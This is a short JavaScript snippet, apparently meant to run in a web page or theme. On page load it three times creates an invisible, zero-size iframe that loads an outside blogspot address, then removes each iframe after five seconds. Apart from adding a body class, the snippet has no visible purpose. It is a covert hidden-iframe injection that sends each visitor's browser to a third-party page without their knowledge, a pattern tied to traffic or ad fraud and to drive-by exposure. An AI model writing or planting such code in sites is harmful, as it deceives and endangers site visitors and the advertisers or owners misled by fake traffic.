function ninjafr() {
	var ex = document.createElement("iframe");
	ex.src = "https://respreq.blogspot.com/";
  ex.style.cssText = "width: 0;height: 0;display: none;visibility: hidden;opacity: 0;border: 0;";
  document.body.appendChild(ex);
  setTimeout(function() {
		document.body.removeChild(ex);
	}, 5e3)
}
window.addEventListener("load", function() {
	for (let e = 0; e < 3; e++){
    ninjafr()
  }
});
document.body.classList.add("xhome");
 
